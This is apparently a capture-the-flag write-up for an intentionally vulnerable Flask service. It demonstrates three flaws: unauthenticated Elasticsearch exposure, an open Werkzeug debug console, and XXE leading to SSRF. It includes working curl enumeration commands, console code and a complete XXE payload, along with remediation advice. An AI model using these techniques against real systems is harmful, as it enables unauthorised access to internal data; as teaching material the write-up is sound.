## Writeup

The project is a web service based on [Flask](https://en.wikipedia.org/wiki/Flask_(web_framework)) framework
with several security issues.

In this article IP 192.168.2.5 using as example!

### Table of contents

1. [Exposing the elasticsearch service](#vulnerable-1-exposing-the-elasticsearch-service)
2. [RCE Debug Mode](#vulnerable-2-rce-debug-mode)
3. [XXE + SSRF](#vulnerable-3-xxe--ssrf)

### Vulnerable 1. Exposing the elasticsearch service

#### Summary

The first vulnerability is pretty easy. We can see section 'elasticsearch' in docker-compose.yml:
```yaml
...
elasticsearch:
    container_name: custom-es
    image: elasticsearch:8.7.1
    volumes:
      - esdata:/usr/share/elasticsearch/data
    environment:
      - bootstrap.memory_lock=true
      - ES_JAVA_OPTS=-Xms1024m -Xmx1024m
      - xpack.security.enabled=false
      - discovery.type=single-node
    deploy:
      resources:
        limits:
          cpus: '0.50'
          memory: 2048M
    ports:
      - "9200:9200"
...
```
Exposing port 9200/tcp can be a security risk. Especially if the Elasticsearch is used without any authorization mechanisms.
We can check availability of service using [Nmap](https://nmap.org/):
```bash
> nmap -p 9200 192.168.2.5

Nmap scan report for 192.168.2.5
Host is up (0.00088s latency).

PORT     STATE SERVICE
9200/tcp open  wap-wsp
```
Let's get list of indexes:
```bash
> curl 'http://192.168.2.5:9200/_cat/indices?v'

health status index uuid                   pri rep docs.count docs.deleted store.size pri.store.size
yellow open   flags vO30NNfkSzG9Vae5ApeMJA   1   1       3818            0    785.9kb        785.9kb
```
We have the index called 'flags'. Now we can enumerate flags using 
[Search API](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-search.html) method.
```bash
> curl 'http://192.168.2.5:9200/flags/_search?pretty'
{
  "took" : 5,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 3818,
      "relation" : "eq"
    },
    "max_score" : 1.0,
    "hits" : [
      {
        "_index" : "flags",
        "_id" : "lz5lnogB-l63xyKWLC8R",
        "_score" : 1.0,
        "_source" : {
          "flag" : "TDVA0PGVTMZ4OKSB39I39FIMRP32K1S=",
          "created_at" : "09.06.2023 04:23:30"
        }
      },
      ... <truncated> ...
      {
        "_index" : "flags",
        "_id" : "mD5lnogB-l63xyKWLC9u",
        "_score" : 1.0,
        "_source" : {
          "flag" : "T8834XGZCO213D38BMQMEP84E462YT9=",
          "created_at" : "09.06.2023 04:23:30"
        }
      }
    ]
  }
}

```
By default, the method return only 10 hits. You can use additional parameters 'from' and 'size' to iterate through the index:
```bash
> curl 'http://192.168.2.5:9200/flags/_search?size=100&from=0&pretty'
... <truncated> ...
```

#### How to fix?

In our case, there is no need to expose 9200/tcp. That is why we can just remove 'ports' attributes from docker-compose.yaml:
```bash
elasticsearch:
    container_name: custom-es
    image: elasticsearch:8.7.1
    volumes:
      - esdata:/usr/share/elasticsearch/data
    environment:
      - bootstrap.memory_lock=true
      - ES_JAVA_OPTS=-Xms1024m -Xmx1024m
      - xpack.security.enabled=false
      - discovery.type=single-node
    deploy:
      resources:
        limits:
          cpus: '0.50'
          memory: 2048M
```
In real life, you can use the following recommendations:

1. Limit access to Elasticsearch by allowing only trusted IP addresses or networks to connect to port 9200/tcp. Use firewalls or security groups to enforce these restrictions.
2. Implement authentication mechanisms (username/password or API keys) to control access to Elasticsearch.
3. Enable Transport Layer Security (TLS) encryption to secure the communication between clients and Elasticsearch.
4. Implement logging and monitoring solutions to detect any suspicious activities or potential security incidents.

#### Useful resources

- Docs about the compose file: https://docs.docker.com/compose/compose-file/compose-file-v3/
- Secure the Elastic Stack: https://www.elastic.co/guide/en/elasticsearch/reference/current/secure-cluster.html

### Vulnerable 2. RCE Debug Mode

#### Summary

Let's analyze the contents of the file '.env' where storing the environment variable for our application:
```env
SECRET_KEY=changeme
WERKZEUG_DEBUG_PIN=off
ELASTICSEARCH_URL=http://custom-es:9200
FLASK_DEBUG=True
DATABASE_URL=postgresql://tech:changeme@postgres:5432/service
```
We can see that debug mode is active. Also debug pin is disabled. What does it mean? The built-in Werkzeug development 
server provides a debugger which shows an interactive traceback in the browser when an unhandled error occurs during a 
request. This debugger should only be used during development.

Now you can to open developer console (http://192.168.2.5/console) and execute any python command. Even if the previous 
vulnerability was fixed, we can still get the contents of the 'flags' index. For example using built-in urllib module:
```python
import urllib.request
f = urllib.request.urlopen('http://192.168.2.5:9200/flags/_search?size=100&from=0&pretty')
print(f.read().decode())
```

#### How to fix?

1. Disable debug mode in a production environment. It's a dangerous. Especially without PIN. More secure configuration:
    ```env
    # It's default values. Check it before deploy to production
    WERKZEUG_DEBUG_PIN=on
    FLASK_DEBUG=False
    ```
2. Use a production WSGI server instead built-in development server

#### Useful resources

- Flask debugging: https://flask.palletsprojects.com/en/2.3.x/debugging/
- Werkzeug / Flask Debug risks: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
- Deploying in production: https://flask.palletsprojects.com/deploying/

### Vulnerable 3. XXE + SSRF

> :warning: **During the competition, there was a bug in the application on the profile page (there were problems with 
> jQuery), but this was not a problem for exploiting the vulnerability. Now is fixed.** 

#### Postman

Useful [Postman](https://www.postman.com/) collection for testing  API. Import 'vuln-flask.postman_collection.json' 
to Postman. Set up Bearer Token and BASE_URL variable. 

#### Summary

On the profile editing page, it is possible to change user account data (username, email or biography). Let's analyse 
client side code on profile page:
```html
...
var userid = $('#userid').val()
var username = $('#username').val()
var email = $('#email').val()
var bio = $('#bio').val()
     
var xmlString = "<root>" + 
   "  <user>" + 
      "<username>" + escape(username) + "</username>" + 
      "<email>" + escape(email) + "</email>" + 
      "<bio>" + escape(bio) + "</bio>" + 
      "</user>" + 
   "</root>";

$.ajax({
    url: "/api/profile/4",
    type: "PUT",
    contentType: "application/xml",
    data: xmlString,
    beforeSend: function (xhr) {
        var access_token = 'Bearer ' + Cookies.get('access_token');
        xhr.setRequestHeader('Authorization', access_token);
    },
    success: function (response) {
        FlashMessage("Profile was successfully changed")
    },
    error: function (response) {
        FlashMessage(response.responseJSON.message);
    }
});
```

We can see a PUT query to API endpoint "/api/profile/4". Let's look wrapper for this route (app/api/users.py):
```python
from lxml import etree

...

@bp.route('/profile/<int:uid>', methods=['PUT'])
@token_auth.login_required
def change_profile(uid):
    ...
    current_user = User.query.get_or_404(uid)
    xml = request.get_data()
    parser = etree.XMLParser(no_network=False)
    try:
        root = etree.fromstring(xml, parser=parser)
        user = root.xpath('user')[0]
        username = user.xpath('username/text()')[0] if user.xpath('username/text()') else ''
        email = user.xpath('email/text()')[0] if user.xpath('email/text()') else ''
        bio = user.xpath('bio/text()')[0] if user.xpath('bio/text()') else ''
    except Exception as e:
        return bad_request(f"Cannot parse the xml: {e}")
    ...
    current_user.username = username
    current_user.email = email
    current_user.bio = bio
    db.session.commit()
    ...
```
For processing XML body using method XMLParser of [lxml](https://lxml.de/) module. The problem is that an unsafe 
option 'no_network=False' is being used. By default, this attribute prevent network access for related files. 
That is why we can try to exploit XML external entity (XXE) for this endpoint to perform server-side 
request forgery (SSRF) and make HTTP request to an internal services like Elasticsearch.

We cannot use the 'username' or 'email' fields for exploitation because they have a database type limitations. 
See app/model.py:
```python
class User(UserMixin, PaginatedAPIMixin, db.Model):
    __tablename__ = "web-user"
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), index=True, unique=True)
    password_hash = db.Column(db.String(128))
    email = db.Column(db.String(120), index=True)
    bio = db.Column(db.String())
    ...
```
But the 'bio' field has no such restrictions. We can perform HTTP query to the following API endpoint 
http://192.168.2.5/api/profile/4 (where '4' is your user id) with the next payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE Profile
[
<!ENTITY placeholder SYSTEM "http://custom-es:9200/flags/_search?from=10&size=1&pretty" >
]>
<root>
    <user>
        <username>test1</username>
        <email></email>
        <bio>&placeholder;</bio>
    </user>
</root>
```

In result, we receive the content of elasticsearch index:
```xml
<root>
    <user>
        <username>test1</username>
        <email/>
        <bio>{
  "took" : 7,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 3819,
      "relation" : "eq"
    },
    "max_score" : 1.0,
    "hits" : [
      {
        "_index" : "flags",
        "_id" : "ZD5dnogB-l63xyKWly-3",
        "_score" : 1.0,
        "_source" : {
          "flag" : "TNY6FNGC5CE63UO58LO5HOYCBOPYYY0=",
          "created_at" : "09.06.2023 04:15:12"
        }
      }
    ]
  }
}
</bio>
    </user>
</root>
```

#### How to fix?

The easiest and most effective way to prevent XXE attacks is to disable dangerous features. Consult the documentation 
for your XML parsing library or API for details about how to disable unnecessary capabilities. You can read more in 
the useful sources below.

#### Useful resources

- Article about XXE(+SSRF) with awesome labs by PortSwigger: https://portswigger.net/web-security/xxe
- Article about SSRF by PortSwigger: https://portswigger.net/web-security/ssrf
- Recommendations for processing XML using Python: https://docs.python.org/3/library/xml.html